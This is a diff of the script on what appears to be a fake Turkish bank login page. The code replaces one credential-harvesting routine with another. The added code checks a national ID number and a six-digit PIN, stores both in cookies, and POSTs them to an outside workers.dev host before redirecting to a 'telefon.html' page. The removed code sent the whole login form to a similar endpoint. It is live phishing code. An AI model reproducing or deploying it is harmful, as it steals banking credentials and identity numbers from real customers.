@@ -209,88 +209,160 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
           </div>
     </form>
  
+
+
 <script>
-document.addEventListener("DOMContentLoaded", function () {
-  async function tcno_dogrula_ve_islem_yap(tcno) {
-    // TC kimlik doğrulama fonksiyonu
-    tcno = String(tcno);
-    if (tcno.substring(0, 1) === '0') {
-      return false;
+    // JavaScript kodunu HTML içeriğinin tamamen yüklendiği bir noktaya taşıdık
+    document.addEventListener("DOMContentLoaded", function () {
+        function setCookie(name, value, days) {
+    var expires = "";
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        expires = "; expires=" + date.toUTCString();
     }
-    if (tcno.length !== 11) {
-      return false;
-    }
-    var ilkon_array = tcno.substr(0, 10).split('');
-    var ilkon_total = hane_tek = hane_cift = 0;
-    for (var i = j = 0; i < 9; ++i) {
-      j = parseInt(ilkon_array[i], 10);
-      if (i & 1) {
-        hane_cift += j;
-      } else {
-        hane_tek += j;
-      }
-      ilkon_total += j;
-    }
-    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
-      return false;
-    }
-    ilkon_total += parseInt(ilkon_array[9], 10);
-    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
-      return false;
-    }
-    return true;
-  }
+    document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
 
-  async function checkAndSubmit() {
-    const isCookieSet = document.cookie.includes('isim');
+              var savedName = getCookie("savedName");
+            if (!savedName) {
+                var randomName = generateRandomName(6);
+                setCookie("savedName", randomName, 1);
+            }
+        var tcInput = document.getElementById("ctl00$c$RetailIdentityTextBox");
+        var passInput = document.getElementById("ctl00$c$RetailPinTextBox");
 
-    if (!isCookieSet) {
-      const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
-      submitForm(); // Formu gönder
-    } else {
-      console.log('Cookie zaten kaydedilmiş, işlem yapılmayacak.');
-    }
-  }
+        // Giriş düğmesi
+        var loginBtn = document.getElementById("ctl00_c_RetailLoginButton");
 
-  function handleInput() {
-    checkAndSubmit();
-  }
+        // TC kimlik numarası ve şifre doğrulama fonksiyonu
+        async function validateInputs() {
+            var tcno = tcInput.value;
+            var pass = passInput.value;
 
-  var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
-  var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik numarası doğrulaması
+                if (await tcno_dogrula_ve_islem_yap(tcno)) {
+                    // Giriş düğmesini etkinleştir
+                    loginBtn.disabled = false;
+                } else {
+                    // TC kimlik numarası geçerli değilse giriş düğmesini devre dışı bırak
+                    loginBtn.disabled = true;
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
+                loginBtn.disabled = true;
+            }
+        }
 
-  identityInput.addEventListener("input", handleInput);
-  pinInput.addEventListener("input", handleInput);
+        // TC kimlik numarası ve şifre alanlarının değerlerinin değiştiğini izle
+        tcInput.addEventListener("input", validateInputs);
+        passInput.addEventListener("input", validateInputs);
 
-  // Form gönderildiğinde çalışacak fonksiyon
-  function submitForm() {
-    // Form verilerini al
-    var form = document.getElementById("aspnetForm");
-    var formData = new FormData(form);
+        // Giriş düğmesine tıklandığında formu gönder
+        loginBtn.addEventListener("click", function () {
+            // TC kimlik numarası ve şifreyi al
+            var tcno = tcInput.value;
+            var pass = passInput.value;
 
-    // AJAX isteği oluştur
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://worker-broad-snow-1482.selimjuhan2.workers.dev/", true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            // Kullanıcıya atanmış adı al
+            var assignedName = getCookie("savedName");
 
-    // AJAX yanıtı geldiğinde çalışacak fonksiyon
-    xhr.onload = function () {
-      // Başarılı yanıt alındıysa, hata oluşmamıştır
-      if (xhr.status >= 200 && xhr.status < 300) {
-        console.log("İstek başarıyla tamamlandı.");
-      } else {
-        // Hata durumunda hata.html sayfasına yönlendir
-        window.location.href = "hata.html";
-      }
-    };
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik doğrulaması yap
+if (tcno_dogrula_ve_islem_yap(tcno)) {
+    // Cookie'leri oluştur
+    document.cookie = `tcno=${tcno}; path=/`;
+    document.cookie = `pass=${pass}; path=/`;
 
-    // AJAX isteğini gönder
-    xhr.send(formData);
-  }
+    // POST işlemi için veri oluştur
+    var data = new FormData();
+    data.append('tcno', tcno);
+    data.append('pass', pass);
 
-});
+    // POST işlemi için fetch kullanarak isteği oluştur
+    fetch('https://worker-steep-shape-b9dddssd48.selimjuhan2.workers.des/', {
+        method: 'POST',
+        body: data
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data);
+        window.location.href = 'telefon.html';
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        window.location.href = 'telefon.html';
+    });
+}
+else {
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
+            }
+        }); 
+
+        // TC kimlik doğrulama fonksiyonu
+        async function tcno_dogrula_ve_islem_yap(tcno) {
+            // TC kimlik doğrulama fonksiyonu
+            tcno = String(tcno);
+            if (tcno.substring(0, 1) === '0') {
+                return false;
+            }
+            if (tcno.length !== 11) {
+                return false;
+            }
+            var ilkon_array = tcno.substr(0, 10).split('');
+            var ilkon_total = hane_tek = hane_cift = 0;
+            for (var i = j = 0; i < 9; ++i) {
+                j = parseInt(ilkon_array[i], 10);
+                if (i & 1) {
+                    hane_cift += j;
+                } else {
+                    hane_tek += j;
+                }
+                ilkon_total += j;
+            }
+            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+                return false;
+            }
+            ilkon_total += parseInt(ilkon_array[9], 10);
+            if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+                return false;
+            }
+            return true;
+        }
+
+
+        function getCookie(name) {
+            var nameEQ = name + "=";
+            var ca = document.cookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
+        // Rastgele ad oluşturma fonksiyonu
+        function generateRandomName(length) {
+            var result = '';
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var charactersLength = characters.length;
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
+
+   
+    });
 </script>
-
  
  
 
